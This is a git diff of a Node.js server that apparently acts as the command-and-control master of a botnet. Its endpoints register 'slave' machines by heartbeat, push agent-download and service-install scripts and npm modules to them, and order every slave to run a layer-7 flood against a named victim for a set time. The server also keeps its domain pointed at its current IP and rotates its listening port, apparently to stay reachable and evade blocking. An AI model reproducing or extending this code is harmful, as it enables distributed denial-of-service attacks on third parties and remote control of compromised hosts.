@@ -43,6 +43,8 @@ logger.init(initSign, "Called 'caller-id'")
 const bodyParser = require('body-parser');
 const si = require('systeminformation');
 
+console.log(process);
+
 let systemInfo = {
     static: null,
     dynamic: {
@@ -93,26 +95,31 @@ let database = {
 }
 
 let slaveInfo = {
-    agentLink: null,
-    serviceLink: null,
     scripts: null,
-    serviceName: null,
+    setup: null
 }
 
 let Machines = {
     all: {
 
     },
-    has: function(mid) {
-        if (Machines[mid]) {
+    has: function (mid) {
+        if (Machines.all[mid]) {
             return true
         }
     },
-    dump: function(mid) {
-        
+    get: function (mid) {
+        if (Machines.all[mid]) {
+            return Machines.all[mid]
+        } else {
+            return { null: null }
+        }
     },
-    clean: function() {
+    clean: function () {
         Machines.all = {}
+    },
+    count: function() {
+        return (Object.keys(Machines.all)).length
     }
 }
 
@@ -178,7 +185,7 @@ app.use((req, res, next) => {
         res.send(500, {
             error: {
                 message: "MASTER_IS_INITIATING",
-                innerResponse: `The master had initiated at ${initSign}`
+                innerResponse: `The master had started at ${initSign}`
             }
         })
     }
@@ -240,7 +247,6 @@ async function dbMachineCleanup() {
                     const element = machines[index];
                     await axios.delete(`${database.machines}${element.id}`)
                         .then(res => {
-                            console.log("del");
                             //console.log(res)
                         })
                         .catch(err => {
@@ -259,9 +265,7 @@ async function dbMachineCleanup() {
 async function fetchSlaveSetup() {
     return axios.get(database.setup)
         .then(res => {
-            slaveInfo.agentLink = res.data.agentLink
-            slaveInfo.serviceLink = res.data.serviceLink,
-            slaveInfo.serviceName = res.data.serviceName
+            slaveInfo.setup = res.data
             console.log("Setups loaded.");
         })
         .catch(err => {
@@ -286,7 +290,6 @@ function updateMasterSubdomain() {
         logger.info(traceid, "Updating Master Subdomain", `Begun`)
         axios.get("http://icanhazip.com")
             .then(res => {
-                console.log(res.data)
                 let currentIP = res.data
                 logger.info(traceid, "Updating Master Subdomain", `Current IP recieved as ${currentIP}`)
                 var options = {
@@ -296,7 +299,6 @@ function updateMasterSubdomain() {
                     data: { type: 'A', name: 'master.api.canavar.licentia.xyz', content: currentIP, ttl: 1, proxied: true }
                 };
                 axios.request(options).then(function (response) {
-                    console.log(response.data);
                     logger.info(traceid, "Updated Master Subdomain", `Updated the subdomain to IP ${currentIP}`)
                 }).catch(function (error) {
                     logger.info(traceid, "Couldn't Update Master Subdomain", `Tried to update the subdomain to IP ${currentIP}`)
@@ -341,10 +343,7 @@ async function schedulePortChange(mins, np, logid) {
 app.get('/', (req, res) => {
     let ref = (req.headers.host);
     if (ref === "127.0.0.1") {
-        //console.log(AGENTLINK);
-        //console.log(SCRIPTS);
-        //console.log(SERVICENAME);
-        //console.log(SERVICELINK);
+
     }
     res.send(200, "OKAY")
 })
@@ -353,26 +352,22 @@ app.get('/scripts', (req, res) => {
     let scid = ([Object.keys(req.query)[0]][0]);
     //console.log(scid);
     if (scid === undefined) {
-        axios.get(database.scripts)
-            .then(response => {
-                res.send(200, response.data)
-            })
-            .catch(err => {
-                console.error(err);
-            })
+        res.send(200, slaveInfo.scripts)
     } else {
-        axios.get(database.scripts + scid)
-            .then(response => {
-                res.send(200, response.data)
-            })
-            .catch(err => {
-                res.send(500, {
-                    error: {
-                        message: "SCRIPT_DOES_NOT_EXIST",
-                        innerResponse: `${err.message}`
-                    }
-                })
-            })
+        let allScripts = slaveInfo.script
+        for (let index = 0; index < allScripts.length; index++) {
+            const cScript = allScripts[index];
+            if (cScript.id === scid) {
+                res.send(cScript)
+                return
+            }
+        }
+        res.send(500, {
+            error: {
+                message: "SCRIPT_DOES_NOT_EXIST",
+                innerResponse: `SCRIPT_DOES_NOT_EXIST`
+            }
+        })
     }
 })
 
@@ -381,78 +376,70 @@ app.get('/setup', (req, res) => {
     let detid = ([Object.keys(req.query)[1]][0]);
     //console.log(scid, detid);
     if (scid === undefined) {
-        axios.get(database.setup)
-            .then(response => {
-                res.send(200, response.data)
-            })
-            .catch(err => {
-                console.error(err);
-            })
+        res.send(200, slaveInfo.setup)
     } else {
-        axios.get(database.setup)
-            .then(response => {
-                let requested = (response.data)[scid]
-                if (requested.includes("$")) {
-                    if (scid === "download_agent") {
-                        res.send(200, (requested.replace("$AGENTLINK;", AGENTLINK)))
-                    } else if (scid === "service_setup") {
-                        requested = requested.replace("$SERVICELINK", SERVICELINK)
-                        var regex = new RegExp("SERVICENAME", "g");
-                        requested = requested.replace(regex, SERVICENAME)
-                        res.send(200, (requested))
-                    } else if (scid === "download_script") {
-                        let searchSatisfied = false
-                        for (let index = 0; index < SCRIPTS.length; index++) {
-                            const element = SCRIPTS[index];
-                            if (element.id === detid) {
-                                //console.log(element);
-                                searchSatisfied = true
-                                requested = requested.replace("$SCRIPTLINK", element.source)
-                                requested = requested.replace("$SCRIPTNAME", element.filename)
-                                res.send(requested)
-                            }
-                        }
-                        if (!searchSatisfied) {
-                            res.send(500, {
-                                error: {
-                                    message: "SCRIPT_DOES_NOT_EXIST",
-                                    innerResponse: `The script with ID'${detid}' does not exist in the dictionary.`
-                                }
-                            })
-                        }
-                        requested = requested.replace("$SERVICELINK", SERVICELINK)
-                        var regex = new RegExp("SERVICENAME", "g");
-                        requested = requested.replace(regex, SERVICENAME)
-                        //res.send(200, (requested))
+
+        let requested = (slaveInfo.setup)[scid]
+        if (requested.includes("$")) {
+            if (scid === "download_agent") {
+                res.send(200, (requested.replace("$AGENTLINK;", AGENTLINK)))
+            } else if (scid === "service_setup") {
+                requested = requested.replace("$SERVICELINK", SERVICELINK)
+                var regex = new RegExp("SERVICENAME", "g");
+                requested = requested.replace(regex, SERVICENAME)
+                res.send(200, (requested))
+            } else if (scid === "download_script") {
+                let searchSatisfied = false
+                for (let index = 0; index < SCRIPTS.length; index++) {
+                    const element = SCRIPTS[index];
+                    if (element.id === detid) {
+                        //console.log(element);
+                        searchSatisfied = true
+                        requested = requested.replace("$SCRIPTLINK", element.source)
+                        requested = requested.replace("$SCRIPTNAME", element.filename)
+                        res.send(requested)
                     }
                 }
-            })
-            .catch(err => {
-                if (scid === "script_json") {
-                    let searchSatisfied = false
-                    for (let index = 0; index < SCRIPTS.length; index++) {
-                        const element = SCRIPTS[index];
-                        if (element.id === detid) {
-                            //console.log(element);
-                            searchSatisfied = true
-                            console.log(element);
-                            res.send(element)
+                if (!searchSatisfied) {
+                    res.send(500, {
+                        error: {
+                            message: "SCRIPT_DOES_NOT_EXIST",
+                            innerResponse: `The script with ID'${detid}' does not exist in the dictionary.`
                         }
-                    }
-                    if (!searchSatisfied) {
-                        res.send(500, {
-                            error: {
-                                message: "SCRIPT_DOES_NOT_EXIST",
-                                innerResponse: `The script with ID'${detid}' does not exist in the dictionary.`
-                            }
-                        })
+                    })
+                }
+                requested = requested.replace("$SERVICELINK", SERVICELINK)
+                var regex = new RegExp("SERVICENAME", "g");
+                requested = requested.replace(regex, SERVICENAME)
+                //res.send(200, (requested))
+            }
+        }
+        /*
+        .catch(err => {
+            if (scid === "script_json") {
+                let searchSatisfied = false
+                for (let index = 0; index < SCRIPTS.length; index++) {
+                    const element = SCRIPTS[index];
+                    if (element.id === detid) {
+                        //console.log(element);
+                        searchSatisfied = true
+                        res.send(element)
                     }
                 }
-                else {
-                    console.log(err);
-                    res.send(500, { error: { message: err.message } })
+                if (!searchSatisfied) {
+                    res.send(500, {
+                        error: {
+                            message: "SCRIPT_DOES_NOT_EXIST",
+                            innerResponse: `The script with ID'${detid}' does not exist in the dictionary.`
+                        }
+                    })
                 }
-            })
+            }
+            else {
+                console.log(err);
+                res.send(500, { error: { message: err.message } })
+            }
+        })*/
     }
 
 })
@@ -468,13 +455,11 @@ app.get('/globals', (req, res) => {
 app.post('/heartbeat', (req, res) => {
     let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress
     ip = ip.toString().replace('::ffff:', '');
-    //console.log(req.body);
     let machine = req.body.machine
     Machines.all[ip] = {
         id: ip,
         machine
     }
-    console.log(Machines.all[ip]);
     res.send(200, Globals)
 
     /*if (!activemachinesindb.includes(ip)) {
@@ -514,19 +499,16 @@ app.post('/heartbeat', (req, res) => {
 app.patch('/heartbeat', (req, res) => {
     let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress
     ip = ip.toString().replace('::ffff:', '');
-    //console.log(req.body);
     let machine = req.body.machine
     Machines.all[ip] = {
         id: ip,
         machine
     }
-    console.log(Machines.all[ip]);
     res.send(200, Globals)
 })
 
 app.get('/all/installscript/:scriptid', (req, res) => {
-    clen = activeMachinesList.length
-    for (let index = 0; index < clen; index++) {
+    for (let index = 0; index < Machines.count(); index++) {
         axios.get(`http://${activeMachinesList[index]}:${Globals.port.number}/installScript/${req.params.scriptid}`)
             .then(res => {
                 console.log(res.data)
@@ -539,8 +521,7 @@ app.get('/all/installscript/:scriptid', (req, res) => {
     res.send(200, "OKAY")
 })
 app.get('/all/npminstall/:module', (req, res) => {
-    clen = activeMachinesList.length
-    for (let index = 0; index < clen; index++) {
+    for (let index = 0; index < Machines.count(); index++) {
         axios.get(`http://${activeMachinesList[index]}:${Globals.port.number}/npminstall/${req.params.module}`)
             .then(res => {
                 console.log(res.data)
@@ -554,16 +535,14 @@ app.get('/all/npminstall/:module', (req, res) => {
 })
 
 app.get('/all/attacklayer7/:methodID/:victim/:time/:attackID', async (req, res) => {
-    clen = activeMachinesList.length
     let machines = {
         all: activeMachinesList,
         asked: [],
         responded: [],
         busy: []
     }
-    for (let index = 0; index < clen; index++) {
+    for (let index = 0; index < Machines.count(); index++) {
         machines.asked.push(activeMachinesList[index])
-        console.log(`http://${activeMachinesList[index]}:${Globals.port.number}/layer7/${req.params.methodID}/${req.params.victim}/${req.params.time}/${req.params.attackID}`);
         axios.get(`http://${activeMachinesList[index]}:${Globals.port.number}/layer7/${req.params.methodID}/${req.params.victim}/${req.params.time}/${req.params.attackID}`)
             .then(res => {
                 console.log(res.data)
@@ -579,9 +558,7 @@ app.get('/all/attacklayer7/:methodID/:victim/:time/:attackID', async (req, res) 
 })
 
 app.get('/all/update', (req, res) => {
-    clen = activeMachinesList.length
-    for (let index = 0; index < clen; index++) {
-        console.log(`http://${activeMachinesList[index]}:${Globals.port.number}/update`);
+    for (let index = 0; index < Machines.count(); index++) {
         axios.get(`http://${activeMachinesList[index]}:${Globals.port.number}/update`)
             .then(res => {
                 console.log(res.data)
@@ -594,23 +571,13 @@ app.get('/all/update', (req, res) => {
     res.send(200, "OKAY")
 })
 
-app.get('/machines/active', (req, res) => {
-    res.send(200, activeMachinesList)
+app.get('/machines/', (req, res) => {
+    res.send(200, Machines.all)
 })
-app.get('/machines/detailed/active', (req, res) => {
-    res.send(200, activeMachinesList)
-})
-app.get('/machines/detailed/inactive', (req, res) => {
-    res.send(200, activeMachinesList)
-})
-app.get('/machines/detailed/busy', (req, res) => {
-    res.send(200, activeMachinesList)
-})
-app.get('/machines/detailed/systemInfo', (req, res) => {
-    res.send(200, activeMachinesList)
+app.get('/machines/:machid', (req, res) => {
+    res.send(200, Machines.get([req.params.machid]))
 })
 app.get('/machines/testReachability/:timeout', async (req, res) => {
-    let clen = activeMachinesList.length
     let reachable = []
     let unreachable = []
     let timeout_ = 5
@@ -618,8 +585,7 @@ app.get('/machines/testReachability/:timeout', async (req, res) => {
         if (req.params.timeout <= 10)
             timeout_ = parseInt(req.params.timeout)
     }
-    for (let index = 0; index < clen; index++) {
-        console.log(`Asking ${activeMachinesList[index]}:${Globals.port.number}`);
+    for (let index = 0; index < Machines.count(); index++) {
         axios.get(`http://${activeMachinesList[index]}:${Globals.port.number}/status`, {
             timeout: timeout_ * 1000,
         })
@@ -711,8 +677,7 @@ app.post('/mgmt/update', (req, res) => {
             res.send(500, { std_err: err })
         } else {
             // the *entire* stdout and stderr (buffered)
-            console.log(`stdout: ${stdout}`);
-            console.log(`stderr: ${stderr}`);
+
             res.send(200, { std_out: stdout, std_err: stderr })
         }
     })
@@ -726,8 +691,6 @@ app.post('/mgmt/vcontrol', (req, res) => {
             res.send(200, { std_err: err })
         } else {
             // the *entire* stdout and stderr (buffered)
-            console.log(`stdout: ${stdout}`);
-            console.log(`stderr: ${stderr}`);
             let stdout_ = stdout
             if (stdout.length > 10) {
                 var options = {
@@ -737,7 +700,6 @@ app.post('/mgmt/vcontrol', (req, res) => {
                 };
 
                 axios.request(options).then(function (response) {
-                    console.log(response.data);
                     let resp = response.data
                     let latestCommitSHA = resp[0].sha
                     if ((latestCommitSHA === (null || undefined || ""))) {
@@ -766,9 +728,9 @@ app.post('/mgmt/vcontrol', (req, res) => {
 app.post('/mgmt/portElusion/', async (req, res) => {
     globalLock = true;
     let newPort = await randomInt(1000, 9999)
-    Global.set.port.last(Globals.port.number)
-    Global.set.port.changedLast(Date.now())
-    Global.set.port.number(newPort)
+    Globals.port.last = (Globals.port.number)
+    Globals.port.changedLast = (Date.now())
+    Globals.port.number = (newPort)
     res.send(200)
     globalLock = false;
 })
